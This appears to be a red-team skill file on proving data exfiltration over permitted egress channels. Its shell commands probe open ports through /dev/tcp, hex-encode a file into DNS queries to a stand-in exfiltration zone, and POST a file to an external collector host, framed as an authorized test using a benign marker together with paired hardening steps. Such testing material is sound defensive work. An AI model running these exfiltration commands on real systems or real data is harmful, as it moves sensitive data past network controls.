---
name: network-egress-exfiltration
description: >-
  Demonstrate data exfiltration and C2 over permitted egress channels during an
  authorized network assessment — showing that with unrestricted or loosely-filtered
  outbound traffic, data can leave (and commands can arrive) by tunneling over allowed
  protocols: DNS, HTTPS/web, ICMP, or an alternative port. Use to prove that an internal
  host with a foothold can move data past the egress boundary because outbound filtering
  and inspection are insufficient.
version: 1.0.0
team: red
app_type: network
killchain:
  framework: mitre-attack
  stage: exfiltration
techniques:
  attack: [T1048.003, T1071.004]
  capec: [CAPEC-116]
  cwe: [CWE-200, CWE-923]
  owasp: []
  d3fend: []
pairs_with: [network-egress-filtering-hardening]
risk:
  level: high
  reversible: true
  data_touch: read
authorization: required
maturity: reviewed
license: Apache-2.0
---

# Network egress exfiltration

## Overview

Defenders spend heavily on keeping attackers out and often leave the *outbound*
boundary wide open — any internal host can talk to any external address on common
ports. That gap is where data leaves and command-and-control comes in. **Exfiltration
over permitted channels** abuses protocols that are almost always allowed: encoding
data into **DNS** queries to an attacker-controlled zone, tunneling over **HTTPS/web** to
blend with normal traffic, using **ICMP** payloads, or simply an **alternative port** the
firewall doesn't restrict. This skill proves, from a host you are authorized to test,
that a **benign marker dataset** can be moved past the egress boundary — measuring which
channels are open and uninspected — without exfiltrating any real data.

## Authorization & scope

**Run only against hosts and networks you are authorized to test**, exfiltrating **only
a benign marker** (a canary string/file you created) to **infrastructure you control**
that is in scope. Do **not** move real, sensitive, or third-party data. Keep volumes
small and clean up any tunnel/listener afterward. The deliverable is which channels are
open and uninspected, plus the marker's arrival as proof — never customer data.

## Preconditions

- Authorization, a foothold host in scope, and an attacker-controlled endpoint/zone in
  scope to receive the marker (a DNS zone you control, an HTTPS collector).
- Tooling for channel testing (a DNS-tunnel utility, `curl`, `ping`, `nc`) and the
  marker dataset.

## Procedure

1. **Baseline allowed egress.** From the foothold, determine what outbound is permitted
   — which ports/protocols reach the internet and whether a proxy is enforced:
   ```bash
   for p in 53 80 443 123 8080; do timeout 2 bash -c "</dev/tcp/1.1.1.1/$p" \
     && echo "egress-open:$p"; done
   ```
2. **Test DNS exfiltration.** Encode the marker into labels queried against your
   in-scope zone and confirm arrival at your authoritative server:
   ```bash
   xxd -p marker.txt | tr -d '\n' | fold -w32 | \
     while read c; do dig +short "$c.exfil.example-lab.com" >/dev/null; done
   ```
3. **Test HTTPS/web egress.** POST the marker to your in-scope collector and confirm it
   arrives — showing web egress is uninspected/uncategorized:
   ```bash
   curl -s -X POST --data-binary @marker.txt https://collector.example-lab.com/u
   ```
4. **Test ICMP / alternative ports.** Where allowed, send the marker in ICMP payloads or
   over a non-standard port to find channels the firewall ignores.
5. **Assess inspection.** Note whether TLS is inspected, whether DNS goes through a
   controlled resolver with logging, and whether any DLP or anomaly detection fired.
6. **Record** which channels succeeded (DNS/HTTPS/ICMP/alt-port), their throughput, and
   whether anything detected them — plus the fix: default-deny egress via a proxy,
   controlled DNS resolvers with logging, TLS inspection where lawful, and DLP/anomaly
   detection on outbound volume.

## Paired defense / offense

Pairs with **network-egress-filtering-hardening**. Each open, uninspected channel this
skill exploits is what that skill closes — default-deny egress, forced proxy/resolver,
and detection of tunneling and anomalous outbound volume.

## Validation

Reproduce in a lab network you own:

1. From an internal host with open egress, exfiltrate a benign marker over DNS and over
   HTTPS to a collector you control; confirm arrival.
2. Note which channels were uninspected and whether anything alerted.
3. Apply the paired hardening (default-deny egress, forced logging resolver/proxy, DNS-
   tunnel/anomaly detection) and confirm the marker no longer leaves and the attempt is
   alerted.

## References

- MITRE ATT&CK T1048.003 Exfiltration Over Unencrypted Non-C2 Protocol, T1071.004
  Application Layer Protocol: DNS
- NIST SP 800-53 Rev 5 (SC-7 Boundary Protection, AU-6); CIS Controls v8 (13 Network
  Monitoring & Defense, 3 Data Protection)
- CAPEC-116; CWE-200, CWE-923
